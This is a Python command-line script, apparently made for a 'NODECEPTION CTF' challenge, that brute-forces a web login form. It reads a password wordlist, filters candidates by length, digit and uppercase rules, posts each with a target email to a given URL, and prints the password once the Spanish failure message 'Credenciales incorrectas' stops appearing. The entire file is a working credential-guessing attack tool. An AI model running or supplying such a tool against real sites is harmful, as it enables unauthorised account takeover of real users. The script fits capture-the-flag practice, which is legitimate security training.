import requests
import argparse

def prRed(s): print("\033[91m {}\033[00m".format(s))
def prYellow(s): print("\033[93m {}\033[00m".format(s))

def validate_word(password):
    flag_1 = 0
    flag_2 = 0
    for word in password:
        if word.isdigit() and flag_1 == 0:
                        flag_1 = flag_1+1
        elif word.isupper() and flag_2 == 0:
                        flag_2 = flag_2+1

        if flag_1 == 1 and flag_2 == 1:
            return 0

    return 1



def bruteForce(url,dictionary,email):
    try:
        conexion = requests.get(url)

        headers = {
                "Content-type":"application/x-www-form-urlencoded",
                "Referer":"application/x-www-form-urlencoded",
                "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
                }


        try:
            with open(dictionary,"r") as linea:
                prYellow(f"[+] Brute force attack starting:")
                print(f"    \033[92murl\033[00m={url}\n    \033[92memail\033[00m={email}")
                for password in linea:
                    password = password.strip()

                    if len(password) >= 8:
                        payload = {
                                "email":email,
                                "password":password
                                }
                        validate = validate_word(password)
                        if validate == 0:
                            response = requests.post(url,data=payload,headers=headers)
                            string = str(response.text)
                            string = string.find("Credenciales incorrectas")
                            if string == -1:
                                print (f" [+] The password for the email \033[94m{email}\033[00m is \033[94m{password}\033[00m")
                                return 0

        except FileNotFoundError:
            prRed("[!] File not found")
            return 1
        except IsADirectoryError:
            prRed(f"[!] {dictionary} is a directory")
            return 1

    except requests.ConnectionError as e:
        print(f"[!] Connection ERROR {url}")


def main():
    parser = argparse.ArgumentParser(description="Brute force login por NODECEPTION CTF")

    parser.add_argument("-d","--dictionary",type=str,required=True,help="Password dictionary")
    parser.add_argument("-u","--url",type=str,required=True,help="Hostname")
    parser.add_argument("-e","--email",type=str,required=True,help="email")

    args = parser.parse_args()
    bruteForce(args.url,args.dictionary,args.email)
    

if __name__=="__main__":
    main()
